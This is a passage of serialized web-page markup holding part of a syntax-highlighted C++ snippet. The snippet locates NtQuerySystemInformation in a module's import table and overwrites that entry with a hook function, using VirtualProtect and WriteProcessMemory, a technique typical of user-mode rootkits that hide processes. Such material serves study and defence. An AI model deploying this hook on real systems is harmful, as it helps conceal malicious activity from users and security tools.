52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement243\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"FirstThunk\"]}],[\"$\",\"span\",\"code-segement244\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement245\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement246\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[28]}],\"\\n\",[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[29]}],[\"$\",\"span\",\"code-segement250\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement251\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"while\"]}],[\"$\",\"span\",\"code-segement252\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement253\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"originalFirstThunk\"]}],[\"$\",\"span\",\"code-segement255\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"u1\"]}],[\"$\",\"span\",\"code-segement257\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement258\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"AddressOfData\"]}],[\"$\",\"span\",\"code-segement259\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement260\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement261\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement262\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[30]}],[\"$\",\"span\",\"code-segement264\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        PIMAGE_IMPORT_BY_NAME funcIBN \"]}],[\"$\",\"span\",\"code-segement265\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement266\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[31]}],[\"$\",\"span\",\"code-segement268\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement269\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement270\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PIMAGE_IMPORT_BY_NAME\"]}],[\"$\",\"span\",\"code-segement271\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement272\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement273\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement274\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"DWORD64\"]}],[\"$\",\"span\",\"code-segement275\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement276\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hModule \"]}],[\"$\",\"span\",\"code-segement277\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement278\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[32]}],[\"$\",\"span\",\"code-segement280\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                    originalFirstThunk\"]}],[\"$\",\"span\",\"code-segement281\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement282\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"u1\"]}],[\"$\",\"span\",\"code-segement283\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement284\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"AddressOfData\"]}],[\"$\",\"span\",\"code-segement285\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement286\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement287\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[33]}],[\"$\",\"span\",\"code-segement289\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        std\"]}],[\"$\",\"span\",\"code-segement290\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement291\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cout \"]}],[\"$\",\"span\",\"code-segement292\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement293\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" funcIBN\"]}],[\"$\",\"span\",\"code-segement294\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement295\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"Name \"]}],[\"$\",\"span\",\"code-segement296\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement297\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" std\"]}],[\"$\",\"span\",\"code-segement298\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement299\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"endl\"]}],[\"$\",\"span\",\"code-segement300\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[34]}],[\"$\",\"span\",\"code-segement303\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement304\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement305\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement306\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement307\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"std\"]}],[\"$\",\"span\",\"code-segement308\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement309\",{\"className\":\"token function\",\"style\":{},\"children\":[\"string\"]}],[\"$\",\"span\",\"code-segement310\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement311\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"funcName\"]}],[\"$\",\"span\",\"code-segement312\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement313\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement314\",{\"className\":\"token function\",\"style\":{},\"children\":[\"compare\"]}],[\"$\",\"span\",\"code-segement315\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement316\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"funcIBN\"]}],[\"$\",\"span\",\"code-segement317\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement318\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"Name\"]}],[\"$\",\"span\",\"code-segement319\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement320\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement321\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement322\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement323\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement324\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement325\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement326\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement327\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[35]}],[\"$\",\"span\",\"code-segement329\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          std\"]}],[\"$\",\"span\",\"code-segement330\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement331\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cout \"]}],[\"$\",\"span\",\"code-segement332\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement333\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement334\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"NTQuerySystemInformation Found!\\\"\"]}],[\"$\",\"span\",\"code-segement335\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement336\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement337\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" std\"]}],[\"$\",\"span\",\"code-segement338\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement339\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"endl\"]}],[\"$\",\"span\",\"code-segement340\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement341\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[36]}],[\"$\",\"span\",\"code-segement343\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          OriginalNtQuerySystemInformationAddress \"]}],[\"$\",\"span\",\"code-segement344\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement345\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" firstThunk\"]}],[\"$\",\"span\",\"code-segement346\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement347\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"u1\"]}],[\"$\",\"span\",\"code-segement348\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement349\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"Function\"]}],[\"$\",\"span\",\"code-segement350\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement351\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[37]}],\"\\n\",[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[38]}],[\"$\",\"span\",\"code-segement355\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          DWORD oldProtect \"]}],[\"$\",\"span\",\"code-segement356\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement357\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement358\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement359\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement360\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[39]}],[\"$\",\"span\",\"code-segement362\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          BOOL succ \"]}],[\"$\",\"span\",\"code-segement363\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement364\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement365\",{\"className\":\"token function\",\"style\":{},\"children\":[\"VirtualProtect\"]}],[\"$\",\"span\",\"code-segement366\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement367\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement368\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"LPVOID\"]}],[\"$\",\"span\",\"code-segement369\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement370\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement371\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"firstThunk\"]}],[\"$\",\"span\",\"code-segement372\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement373\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"u1\"]}],[\"$\",\"span\",\"code-segement374\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement375\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"Function\"]}],[\"$\",\"span\",\"code-segement376\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement377\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement378\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"8\"]}],[\"$\",\"span\",\"code-segement379\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement380\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[40]}],[\"$\",\"span\",\"code-segement382\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                     PAGE_READWRITE\"]}],[\"$\",\"span\",\"code-segement383\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement384\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement385\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement386\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"oldProtect\"]}],[\"$\",\"span\",\"code-segement387\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement388\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement389\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[41]}],[\"$\",\"span\",\"code-segement391\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement392\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"char\"]}],[\"$\",\"span\",\"code-segement393\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" patch\"]}],[\"$\",\"span\",\"code-segement394\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement395\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"8\"]}],[\"$\",\"span\",\"code-segement396\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement397\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement398\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement399\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement400\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement401\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement402\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement403\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement404\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[42]}],[\"$\",\"span\",\"code-segement406\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement407\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"void\"]}],[\"$\",\"span\",\"code-segement408\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement409\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement410\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hookAddress \"]}],[\"$\",\"span\",\"code-segement411\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement412\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement413\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement414\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"HookedNtQuerySystemInformation\"]}],[\"$\",\"span\",\"code-segement415\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[43]}],[\"$\",\"span\",\"code-segement418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement419\",{\"className\":\"token function\",\"style\":{},\"children\":[\"memcpy_s\"]}],[\"$\",\"span\",\"code-segement420\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement421\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"patch\"]}],[\"$\",\"span\",\"code-segement422\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement423\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement424\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"8\"]}],[\"$\",\"span\",\"code-segement425\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement426\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement427\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement428\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hookAddress\"]}],[\"$\",\"span\",\"code-segement429\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement431\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"8\"]}],[\"$\",\"span\",\"code-segement432\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement433\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement434\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[44]}],[\"$\",\"span\",\"code-segement436\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          succ \"]}],[\"$\",\"span\",\"code-segement437\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement438\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement439\",{\"className\":\"token function\",\"style\":{},\"children\":[\"WriteProcessMemory\"]}],[\"$\",\"span\",\"code-segement440\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement441\",{\"className\":\"token function\",\"style\":{},\"children\":[\"GetCurrentProcess\"]}],[\"$\",\"span\",\"code-segement442\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement443\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement444\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement445\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[45]}],[\"$\",\"span\",\"code-segement447\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                    \"]}],[\"$\",\"span\",\"code-segement448\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement449\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"LPVOID\"]}],[\"$\",\"span\",\"code-segement450\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement451\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 